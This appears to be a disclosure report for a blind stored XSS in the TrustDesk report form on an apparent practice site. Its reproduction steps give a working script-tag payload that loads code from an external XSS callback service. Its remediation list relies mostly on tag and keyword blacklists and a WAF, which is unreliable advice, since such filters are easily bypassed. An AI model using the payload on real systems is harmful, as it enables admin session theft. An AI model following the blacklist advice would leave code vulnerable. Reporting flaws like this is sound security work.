## Title
Blind XSS - TrustDesk Safety & Trust Center

## Description
**Affected URL:** https://trustdesk.pwnedbox.site/

TrustDesk's report submission form appears to accept HTML/JavaScript payloads in user-controlled fields without adequate sanitization. The submitted report is stored and later displayed in the staff/admin case review interface. A remote script payload was submitted through the report form and subsequently triggered a callback to an external XSS reporting service when the stored report was accessed. This demonstrates a Blind Stored Cross-Site Scripting (Blind XSS) vulnerability affecting the administrative review workflow.

## Steps to Reproduce

1. Open the TrustDesk reporting page: https://trustdesk.pwnedbox.site/report.php
2. Fill out the required report fields and insert the following payload into a user-controlled field, such as **Report title**: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Submit the report.
4. Observe the confirmation page showing that the report was received and a case number was generated.
5. Access the TrustDesk staff/admin review interface and open the submitted case.
6. Observe that the stored report content is rendered in the case details.
7. Check the XSS reporting dashboard and verify that the callback was received from the affected administrative page.


## POC (Proof of Concept)

**Screenshot 1:** Report form with the payload entered into report fields.

<img width="1918" height="971" alt="image" src="https://github.com/user-attachments/assets/e6fe106d-e193-47a3-9b01-31f3f99b2f32" />

**Screenshot 2:** Report submission confirmation and generated case number.

<img width="1915" height="975" alt="image" src="https://github.com/user-attachments/assets/526fa3be-6e0d-46cd-9507-a8dee7a145b4" />

**Screenshot 3:** TrustDesk staff login page showing the administrative review interface.

<img width="1916" height="956" alt="image" src="https://github.com/user-attachments/assets/3ac8449b-74af-44d4-8fcc-396f5052ac55" />

**Screenshot 4:** Admin case view displaying the submitted report content.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/ef81f843-9fd5-4d07-8e9b-a38e54719247" />

**Screenshot 5:** XSS reporting dashboard showing callbacks associated with the TrustDesk administrative pages.

<img width="1916" height="963" alt="image" src="https://github.com/user-attachments/assets/d5ee2a42-23d8-4830-9cc1-25f96afd6c07" />

**Screenshot 6:** Captured browser information, including DOM and storage-related data displayed by the XSS reporting service.

<img width="1915" height="963" alt="image" src="https://github.com/user-attachments/assets/a73b29b4-3026-4295-b9e3-dcdbf081cc13" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
